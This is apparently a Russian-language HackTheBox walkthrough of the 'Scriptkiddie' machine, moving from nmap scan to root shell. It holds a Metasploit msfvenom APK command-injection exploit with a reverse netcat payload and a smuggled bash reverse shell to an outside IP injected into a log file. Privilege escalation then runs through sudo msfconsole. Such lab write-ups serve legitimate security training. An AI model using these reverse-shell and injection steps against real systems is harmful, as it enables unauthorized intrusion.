# Scriptkiddie
## HTB machine

- Название: Scriptkiddie  
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 06.02.21

## Write-up

```html
┌──(kali@kali)-[~/Downloads]
└─$ nmap -sV 10.10.10.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 00:17 UTC
Nmap scan report for 10.10.10.226
Host is up (0.084s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
```

>Действуем по этой уязвимости -- https://www.exploit-db.com/exploits/49491
>Она же в Metasploit -- exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection

```html
┌──(kali@kali)-[~/Downloads]
└─$ msfconsole                  
                                                  
# cowsay++
 ____________                                                                    
< metasploit >                                                                   
 ------------                                                                    
       \   ,__,                                                                  
        \  (oo)____                                                              
           (__)    )\                                                            
              ||--|| *                                                           
                                                                                 

       =[ metasploit v6.0.30-dev                          ]
+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
<session_id>                                                                     

msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.127    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.15.8
lhost => 10.10.15.8                                                          
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 1234
lport => 1234                                                                                                                        
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set rhost 10.10.10.226                                                         
rhost => 10.10.10.226                                                                                                                       
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set rport 5000                                                                     
rport => 5000                                                                    
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run                                                                                
                                                                                 
[+] msf.apk stored at /home/kali/.msf4/local/msf.apk w
```

>Получаем apk файл, далее идем на сайт, который лежит на 5000 порту и в 'Payloads' выбираем:
>OS: android
>lhost: наш ip
>и apk файл

```html
┌──(kali@kali)-[~/Downloads]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

>После этого клацаем 'generate':

```html
┌──(kali@kali)-[~/Downloads]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.15.8] from (UNKNOWN) [10.10.10.226] 34814
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
python3 -c 'import pty; pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ ls
ls
__pycache__  app.py  static  templates
```

>Первый флаг:

```html
kid@scriptkiddie:~$ ls
ls
html  logs  snap  user.txt
kid@scriptkiddie:~$ cat user.txt
cat user.txt
e564b7a3c9e4b2676f4d16**********
```

>Находим так же некий скрипт:

```html
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

>Он читает файл 'hackers' и после совершает свои махинации в домашнем каталоге 'pwn', получим его сессию через запись в файл 'hackers':

```html
kid@scriptkiddie:~/logs$ echo "blyat   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/4444 0>&1' #" >> hackers
< -i >& /dev/tcp/10.10.15.8/4444 0>&1' #" >> hackers
```

>Не забываем заранее включить слушатель:

```html
┌──(kali@kali)-[~/Downloads]
└─$ nc -lnvp 4444        
listening on [any] 4444 ...
```

>Это вышло не с первого и даже не с 5 раза. Далее проверяем, что мы можем выполнять от root:

```html
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

>Проверяем:

```html
pwn@scriptkiddie:~$ sudo msfconsole
sudo msfconsole
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
msf6 > whoami
stty: 'standard input': Inappropriate ioctl for device
[*] exec: whoami

root
```

>Теперь просто находим флаг:

```html
msf6 > cat root.txt
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat root.txt

4e9a0b9b33ee882ade856d**********
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
```
